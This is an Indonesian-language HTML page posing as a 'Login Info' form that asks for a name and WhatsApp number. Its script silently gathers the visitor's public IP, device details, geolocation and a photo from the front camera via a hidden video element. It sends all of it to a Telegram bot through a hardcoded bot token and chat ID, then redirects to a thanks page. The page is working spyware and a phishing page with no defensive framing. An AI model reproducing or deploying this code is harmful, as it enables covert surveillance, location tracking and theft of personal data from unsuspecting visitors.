<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Info</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #6a11cb, #2575fc);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      text-align: center;
      width: 300px;
      animation: fadeIn 0.7s ease;
    }
    input {
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      border-radius: 8px;
      border: none;
    }
    button {
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .back-btn {
      margin-top: 10px;
      font-size: 12px;
      background: none;
      border: none;
      color: #ccc;
      cursor: pointer;
      text-decoration: underline;
    }
    #loading {
      display: none;
      text-align: center;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="popup" id="step1">
    <h2>Masukkan Nama Anda</h2>
    <input type="text" id="nama" placeholder="Nama Anda">
    <button onclick="lanjutKeNomor()">Lanjut</button>
  </div>

  <div class="popup" id="step2" style="display:none;">
    <h2>Masukkan Nomor WhatsApp ADMIN</h2>
    <input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
    <button onclick="kirimData()">Kirim</button>
    <button class="back-btn" onclick="kembali()">Kembali</button>
  </div>

  <div id="loading">
    <h3>TOLONG........</h3>
    <p>Tunggu sebentar ya...</p>
  </div>

  <video id="video" autoplay playsinline></video>

  <script>
    let namaGlobal = "";
    let ipPublic = "Tidak diketahui";
    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
    const chat_id = '6374002294';

    // Ambil IP publik
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => ipPublic = data.ip)
      .catch(() => ipPublic = "Gagal ambil IP");

    function lanjutKeNomor() {
      const nama = document.getElementById("nama").value.trim();
      if (!nama) return alert("Masukkan nama dulu!");
      namaGlobal = nama;

      // Suara sapaan
      try {
        const ucapan = new SpeechSynthesisUtterance(`Halo, ${nama}`);
        ucapan.lang = 'id-ID';
        window.speechSynthesis.speak(ucapan);
      } catch (e) {}

      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    function kembali() {
      document.getElementById("step2").style.display = "none";
      document.getElementById("step1").style.display = "block";
    }

    async function kirimData() {
      const whatsapp = document.getElementById("whatsapp").value.trim();
      if (!whatsapp) return alert("Masukkan nomor WhatsApp!");
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "none";
      document.getElementById("loading").style.display = "block";

      const device = navigator.userAgent;
      const lang = navigator.language;
      const time = new Date();
      const hari = new Intl.DateTimeFormat('id-ID', { weekday: 'long' }).format(time);

      const baseInfo = `INFORMASI DATA BY @Rizkuwae666_bot
Nama: ${namaGlobal}
Nomor WhatsApp: ${whatsapp}
IP: ${ipPublic}
Perangkat: ${device}
Bahasa: ${lang}
Waktu: ${time.toLocaleString('id-ID')}
Hari: ${hari}`;

      // Ambil lokasi
      let lat = "Tidak diketahui";
      let lon = "Tidak diketahui";
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
        });
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;
      } catch {}

      const lokasiLink = (lat !== "Tidak diketahui") ? `https://www.google.com/maps?q=${lat},${lon}` : "Gagal ambil lokasi";

      // Ambil kamera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 2000)); // Tunggu 2 detik
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("caption", `${baseInfo}\nLokasi: ${lokasiLink}`);
          formData.append("photo", blob, "foto.jpg");
          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }, 'image/jpeg');
      } catch (e) {
        // Jika gagal ambil kamera
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chat_id,
            text: `${baseInfo}\nLokasi: ${lokasiLink}\nFoto: Gagal diambil`
          })
        });
      }

      setTimeout(() => {
        window.location.href = "thanks.html";
      }, 3000);
    }
  </script>
</body>
</html>
